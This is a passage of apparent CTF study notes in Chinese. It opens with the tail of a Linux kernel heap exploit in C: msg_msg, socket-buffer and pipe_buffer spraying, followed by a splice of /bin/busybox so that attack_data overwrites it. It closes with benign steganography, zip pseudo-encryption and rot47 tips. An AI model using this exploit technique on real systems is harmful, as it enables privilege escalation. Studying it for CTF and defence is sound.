    *(uint64_t*)(buf+8*2) = 0x2;
    *(uint64_t*)(buf+8*3) = 0x400-0x30;
    *(uint64_t*)(buf+8*4) = NULL;
    *(uint64_t*)(buf+8*5) = NULL;
    *(uint64_t*)(buf+8*6) = 0xdeadbeaf;
    *(uint64_t*)(buf+8*7) = 0xdeadbeaf;
    for(int i = 300;i<310;i++){
      *(uint64_t*)(buf+8*8) = i;
      if (write(ss[i][0], buf, 0x400-0x140) < 0) {
          perror("[-] write");
          return -1;
      }
    }
    //show_msg是以idx为基准的
    int skb_buf1,skb_buf2;
    show_msg(msgqid[msg_key],buf,0x400-0x30,0x1);
    skb_buf1 = *(uint64_t*)(buf + 8*3);
    printf("skb_buf1 :%d\n",*(uint64_t*)(buf + 8*3));
    free_msg(msgqid[msg_key],buf,0x400-0x30,2);
    *(uint64_t*)buf = heap_addr1;
    *(uint64_t*)(buf+8) = heap_addr1;
    *(uint64_t*)(buf+8*2) = 2;
    *(uint64_t*)(buf+8*3) = 0x400-0x30;
    *(uint64_t*)(buf+8*4) = NULL;
    *(uint64_t*)(buf+8*5) = NULL;
    *(uint64_t*)(buf+8*6) = 0xdeadbeaf;
    *(uint64_t*)(buf+8*7) = 0xdeadbeaf;
    for(int i = 310;i<330;i++){
      *(uint64_t*)(buf+8*8) = i;
      if (write(ss[i][0], buf, 0x400-0x140) < 0) {
          perror("[-] write");
          return -1;
      }
    }
    show_msg(msgqid[msg_key],buf,0x400-0x30,0x1);
    skb_buf2 = *(uint64_t*)(buf + 8*3);
    printf("skb_buf2 :%d\n",*(uint64_t*)(buf + 8*3));
    if (read(ss[skb_buf1][1], buf, 0x400-0x140) < 0) {
        perror("[-] read");
        return -1;
    }
    //整理碎片
    for(int i = 330;i < 340;i++){
      // *(uint64_t*)(buf+8*8) = i;
      memset(buf,'x',0x400);
      if (write(ss[i][0], buf, 0x400-0x140) < 0) {
          perror("[-] write");
          return -1;
      }
    }
    puts("[3-1] pipe_prime");
    puts("pipe buffer");
    int pipefd[5][2];
    for(int i = 0;i<5;i++){
      if (pipe(pipefd[i]) < 0) {
          perror("[-] pipe");
          return -1;
      }
      memset(buf,"x",0x400);
      const unsigned pipe_size = fcntl(pipefd[i][1], F_GETPIPE_SZ);
      static char buffer[4096];
      for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        write(pipefd[i][1], buffer, n);
        r -= n;
      }

      for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        read(pipefd[i][0], buffer, n);
        r -= n;
      }
      int attack_fd = open("/bin/busybox",O_RDONLY);
      if(attack_fd < 0){
          perror("open");
          _exit(0);
      }
      loff_t offset = 0x1fdac8;
      splice(attack_fd,&offset,pipefd[i][1], NULL, 1, 0);
    }
    if (read(ss[skb_buf2][1], buf, 0x400-0x140) < 0) {
        perror("[-] read");
        return -1;
    }
    *(uint64_t*)(buf + 3*8) = 0x10;
    //整理碎片
    for(int i = 340;i < 370;i++){
      if (write(ss[i][0], buf, 0x400-0x140) < 0) {
          perror("[-] write");
          return -1;
      }
    }
    for(int i = 0 ;i< 5;i++){
      if (write(pipefd[i][1],attack_data, sizeof(attack_data)) < 0) {
          perror("[-] write");
          return -1;
      }
    }
    for(int i = 0;i<5;i++){
      close(pipefd[i][1]);
      close(pipefd[i][0]);
    }
    memset(msgbuf.mtext,'\x00',0x400);
    for(int i = 1000;i<1100;i++){
      msgbuf.mtype = 1;
      add_msg(msgqid[i],&msgbuf,0x400-0x30);//避免pipe_buffer和skb_buffer释放的时候造成double free的错误
    }
    logi("Enter exit");
    // __pause("debug");
    // system("/bin/sh");

}
```





## 杂项知识点

### 0宽隐写一把锁

https://yuanfux.github.io/zero-width-web/

### 2张图片盲水印

用BlindWaterMark 

```
python bwm.py decode ./ta.png ./tb.png flag.png
python3 bwmforpy3.py decode --oldseed ./ta.png ./tb.png out1.png

python3 bwmforpy3.py decode ./ta.png ./tb.png out1.png
```



### png隐写

zsteg一把梭检测 lsb隐写 以及 png是否包含内容

```bash
zsteg --all 00000646.png
# 提取解压
zsteg 00000646.png -E b1,r,lsb,xy > 1.zip
```

stegsolve 查通道图



### MP3Stego隐写

```bash
没密码
./Decode.exe -X cipher.mp3
有密码
./Decode.exe -X -P xxx cipher.mp3
```



### 分离

foremost 分离文件包含

```bash
foremost 1.jpg
```



### 二维码扫码

https://merricx.github.io/qrazybox/

### zip伪加密

504B0102 ：目录区 全局方位标记为0900==加密/0000 == 无加密

504B0304 ：数据区 0900==加密 

![CTF misc zip、rar文件伪加密_数据区](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/17110420_62abef34087ca67794.png)

### rot47解密

https://rot47.net/

```
2lO,.j2lL000iZZ2[2222iWP,.ZQQX,2.[002iZZ2[2020iWP,.ZQQX,2.[020iZZ2[2022iWLNZQQX,2.[2202iW2,2.ZQQX,2.[022iZZ2[2220iWPQQZQQX,2.[200iZZ2[202iZZ2[2200iWLNZQQX,2.[220iZZ2[222iZZ2[2000iZZ2[2002iZZ2Nj2]20lW2]20l2ZQQX,2]202.ZW2]02l2]20,2]002.XZW2]22lW2]2ZQQX,2]002.XZWWP2XZQQX,2]022.ZW2]00l2]20,2]220.XZW2]2lWPQQZQQX,2]002.XZW2]0lWPQQZQQX,2]020.XZ2]20,2]202.Z2]00Z2]02Z2]2j2]22l2]2ZWPQQZQQX,2]022.Z2]00Z2]0Z2]2Z2]22j2]2lW2]000X,2]20.,2]20.j2]2W2]2W2]22ZQ-QQZ2]2020ZWP,.ZQQX,2]020.Z2]2220ZQ--QZ2]002Z2]220Z2]020Z2]00ZQW---Q--QZ2]002Z2]000Z2]200ZQ--QZ2]002Z2]000Z2]002ZQ--QZ2]002Z2]020Z2]022ZQ--QZ2]002Z2]000Z2]022ZQ--QZ2]002Z2]020Z2]200ZQ--QZ2]002Z2]000Z2]220ZQLQZ2]2222Z2]2000Z2]000Z2]2002Z2]222Z2]020Z2]202Z2]222Z2]2202Z2]220Z2]2002Z2]2002Z2]2202Z2]222Z2]2222Z2]2202Z2]2022Z2]2020Z2]222Z2]2220Z2]2002Z2]222Z2]2020Z2]002Z2]202Z2]2200Z2]200Z2]2222Z2]2002Z2]200Z2]2022Z2]200ZQN---Q--QZ2]200Z2]000ZQXjQZQ-QQXWXXWXj
```

